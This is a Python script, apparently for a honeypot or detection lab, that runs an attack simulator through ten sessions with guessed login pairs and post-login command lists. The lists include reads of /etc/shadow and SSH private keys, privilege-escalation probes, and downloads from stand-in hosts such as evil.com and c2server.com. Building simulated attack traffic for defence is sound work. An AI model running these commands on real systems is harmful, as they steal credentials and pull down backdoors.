#!/usr/bin/env python3
"""Run 10 varied attack sessions with different credentials and commands."""
import subprocess
import sys
import os

PY = r"C:\Users\lnorton\AppData\Local\Python\bin\python3.14.exe"
SCRIPT = os.path.join(os.path.dirname(__file__), "attack_simulator.py")

SESSIONS = [
    {"name": "V2-db-recon", "FAILED": "oracle:oracle|dbadmin:dbadmin", "SUCCESS": "admin:test123", "CMDS": "which mysql|which psql|ps aux|cat /etc/services|ls -la /var/lib/|netstat -tlnp|exit"},
    {"name": "V3-red-recon", "FAILED": "deploy:deploy|devops:devops|ci:ci", "SUCCESS": "admin:test123", "CMDS": "ip addr|ip route|cat /etc/resolv.conf|ping -c1 8.8.8.8|netstat -tlnp|ss -tlnp|exit"},
    {"name": "V4-privesc", "FAILED": "backup:backup123|admin:admin123", "SUCCESS": "admin:test123", "CMDS": "sudo -l|find / -perm -4000 2>/dev/null|cat /etc/sudoers|ls -la /etc/cron*|w|whoami|id|exit"},
    {"name": "V5-web-postexploit", "FAILED": "www-data:www-data|apache:apache|nginx:nginx", "SUCCESS": "admin:test123", "CMDS": "ls -la /var/www/|cat /var/www/html/config.php|ls -la /tmp|wget http://evil.com/shell.php|curl http://c2server.com/beacon|exit"},
    {"name": "V6-git-enum", "FAILED": "git:git123|github:github", "SUCCESS": "admin:test123", "CMDS": "find / -name .git -type d 2>/dev/null|ls -la /home/|cat /home/*/.ssh/authorized_keys 2>/dev/null|exit"},
    {"name": "V7-jenkins-recon", "FAILED": "jenkins:jenkins|admin:jenkins123", "SUCCESS": "admin:test123", "CMDS": "ls -la /var/jenkins_home/ 2>/dev/null|ps aux | grep jenkins|netstat -tlnp | grep 8080|exit"},
    {"name": "V8-docker-recon", "FAILED": "docker:docker123|container:container", "SUCCESS": "admin:test123", "CMDS": "docker ps 2>/dev/null|ls -la /var/run/docker.sock 2>/dev/null|cat /proc/1/cgroup|ls -la /.dockerenv|exit"},
    {"name": "V9-pentest-tools", "FAILED": "kali:kali|parrot:parrot|blackarch:blackarch", "SUCCESS": "admin:test123", "CMDS": "which nmap|which hydra|which john|ls /usr/share/wordlists/ 2>/dev/null|cat /etc/passwd | grep -v nologin|exit"},
    {"name": "V10-multi-vector", "FAILED": "admin:password123|user:user123|root:root123|mysql:mysql123|postgres:postgres123", "SUCCESS": "admin:test123", "CMDS": "whoami|id|uname -a|cat /etc/shadow|ls -la /home|w|wget http://evil.com/backdoor|curl http://c2server.com/beacon|chmod 777 /tmp|crontab -l|exit"},
    {"name": "V11-ssh-tunnel", "FAILED": "tunnel:tunnel123|vpn:vpn123", "SUCCESS": "admin:test123", "CMDS": "ssh -L 8080:localhost:80 root@localhost|cat /etc/ssh/sshd_config|ls -la ~/.ssh/|cat ~/.ssh/id_rsa 2>/dev/null|netstat -tlnp|exit"},
]

for i, s in enumerate(SESSIONS, 1):
    print(f"\n{'='*60}")
    print(f"  SESION {i}/10: {s['name']}")
    print(f"{'='*60}")
    
    env = os.environ.copy()
    env["FAILED_ATTEMPTS"] = s["FAILED"]
    env["SUCCESS_ATTEMPT"] = s["SUCCESS"]
    env["COMMANDS"] = s["CMDS"]
    
    result = subprocess.run(
        [PY, SCRIPT],
        env=env,
        capture_output=False,
        text=True,
        cwd=os.path.dirname(os.path.dirname(__file__))
    )
    print(f"  Exit code: {result.returncode}")

print("\n=== TODAS LAS SESIONES COMPLETADAS ===")
